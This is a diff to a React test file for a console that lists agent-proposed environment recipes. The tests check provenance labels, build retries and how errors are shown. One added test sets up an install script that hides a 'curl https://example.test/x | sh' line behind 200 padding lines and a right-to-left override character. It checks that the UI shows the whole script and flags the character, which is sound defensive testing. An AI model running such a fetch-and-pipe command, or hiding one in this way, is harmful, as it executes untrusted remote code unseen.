@@ -1,4 +1,4 @@
-import { cleanup, fireEvent, render, screen, waitFor, within } from "@testing-library/react";
+import { act, cleanup, fireEvent, render, screen, waitFor, within } from "@testing-library/react";
 import { afterEach, beforeEach, expect, it, vi } from "vitest";
 import { api } from "@/lib/api";
 import { organizationEnvironment, type EnvironmentRecipe, type EnvironmentStatus, type EnvironmentVersion } from "@/lib/organizationEnvironment";
@@ -267,7 +267,7 @@ it("lists a recipe as a proposal with its five results shown separately and a fa
   const recipes = screen.getByLabelText("Environment recipes");
   expect(recipes.textContent).toMatch(/1 check failed\./);
   expect(recipes.textContent).toMatch(/it changes nothing until an admin applies it/);
-  expect(within(recipes).getByLabelText("Who observed the results").textContent).toMatch(/Observed by TerminalX/);
+  expect(within(recipes).getByLabelText("Who observed the results").textContent).toMatch(/Re-run by TerminalX on the preparation machine.*not an independent result/);
   const machine = within(recipes).getByLabelText("Proposed machine setup");
   expect(machine.textContent).toMatch(/apt-get install -y jq ripgrep/);
   expect(machine.textContent).toMatch(/Changes the current script/);
@@ -278,9 +278,76 @@ it("lists a recipe as a proposal with its five results shown separately and a fa
   const rows = within(within(recipes).getByLabelText("Results for acme/widgets")).getAllByRole("row").slice(1);
   expect(rows.map((row) => within(row).getAllByRole("cell")[0].textContent)).toEqual(["Install", "Lint", "Test", "Build", "Start"]);
   expect(rows[2].textContent).toMatch(/pnpm test/);
-  expect(rows[2].textContent).toMatch(/Failed \(already failing before this recipe\) \(exit 1\)/);
+  expect(rows[2].textContent).toMatch(/Failed \(also fails without this recipe's setup\) \(exit 1\)/);
+  expect(recipes.textContent).toMatch(/Checked at commit aaaaaaaaaaaa/);
   expect(rows[2].textContent).not.toMatch(/Passed/);
   expect(rows[4].textContent).toMatch(/Skipped/);
+});
+
+it("shows a proposed script whole, however long, and writes out characters that would hide part of it", async () => {
+  const padding = Array.from({ length: 200 }, (_, line) => `# step ${line}`).join("\n");
+  const installScript = `apt-get install -y jq\n${padding}\ncurl https://example.test/x | sh\u202e`;
+  environment.recipes.mockResolvedValue({ recipes: [recipe({ definition: { ...recipe().definition, installScript } })], contextRevision: "rev-1" });
+  mount();
+  await settled();
+  const shown = screen.getByLabelText("Proposed machine install script");
+  // No height limit and no scroll box: the last line is in the page like the first.
+  expect(shown.className).not.toMatch(/max-h|overflow/);
+  expect(shown.textContent).toContain("curl https://example.test/x | sh");
+  expect(shown.textContent).toContain("\u27e6U+202E\u27e7");
+  const machine = screen.getByLabelText("Proposed machine setup");
+  expect(machine.textContent).toMatch(/202 lines, shown in full\. It contains 1 hidden or direction-changing character/);
+  expect(screen.getByLabelText("Script of step 1").className).not.toMatch(/max-h|overflow/);
+});
+
+it("offers no action on a recipe whose state it does not know", async () => {
+  environment.recipes.mockResolvedValue({ recipes: [recipe({ state: "unknown" })], contextRevision: "rev-1" });
+  mount();
+  await settled();
+  expect(screen.getByLabelText("Environment recipes").textContent).toMatch(/In a state this version does not know/);
+  expect(screen.queryByRole("button", { name: "Apply…" })).toBeNull();
+  expect(screen.queryByRole("button", { name: "Dismiss" })).toBeNull();
+});
+
+it("asks for a new build, not a replay, once the template has changed since a lost answer", async () => {
+  environment.status.mockResolvedValue(status({ rebuildRequired: true }));
+  mount();
+  await settled();
+  const press = async () => {
+    const section = screen.getByLabelText("Build a version");
+    fireEvent.click(await within(section).findByRole("button", { name: "Build version…" }));
+    fireEvent.click(within(section).getByRole("button", { name: "Start build" }));
+  };
+  environment.build.mockRejectedValueOnce({ code: "cloud_environment_outcome_unknown", status: null });
+  // By the time the screen has reloaded, someone has saved a new revision.
+  environment.status.mockResolvedValue(status({ rebuildRequired: true, template: { ...status().template!, revision: 4 } }));
+  await press();
+  await screen.findByRole("alert");
+  environment.build.mockResolvedValueOnce(version());
+  await press();
+  await waitFor(() => expect(environment.build).toHaveBeenCalledTimes(2));
+  expect(environment.build.mock.calls[1][1]).not.toBe(environment.build.mock.calls[0][1]);
+});
+
+it("keeps an action's error on screen while a build is being followed", async () => {
+  vi.useFakeTimers({ shouldAdvanceTime: true });
+  try {
+    const building = version({ id: "version-3", number: 3, state: "running", stage: "install", publication: null });
+    environment.status.mockResolvedValue(status({ versions: [building, version()] }));
+    environment.cancel.mockRejectedValue({ code: "cloud_environment_version_not_found", status: 404 });
+    mount();
+    await settled();
+    fireEvent.click(within(screen.getByLabelText("Version 3")).getByRole("button", { name: "Cancel build" }));
+    expect((await screen.findByRole("alert")).textContent).toMatch(/no longer available/);
+    const before = environment.status.mock.calls.length;
+    await act(async () => {
+      await vi.advanceTimersByTimeAsync(11_000);
+    });
+    expect(environment.status.mock.calls.length).toBeGreaterThan(before);
+    expect(screen.getByRole("alert").textContent).toMatch(/no longer available/);
+  } finally {
+    vi.useRealTimers();
+  }
 });
 
 it("labels results that are only the agent's own report as such", async () => {
@@ -289,7 +356,7 @@ it("labels results that are only the agent's own report as such", async () => {
   await settled();
   const who = screen.getByLabelText("Who observed the results");
   expect(who.textContent).toMatch(/Reported by the agent\. TerminalX did not run these commands itself\./);
-  expect(who.textContent).not.toMatch(/Observed by TerminalX/);
+  expect(who.textContent).not.toMatch(/Re-run by TerminalX|Observed by TerminalX/);
 });
 
 it("applies a recipe only after a confirmation that says what it replaces", async () => {
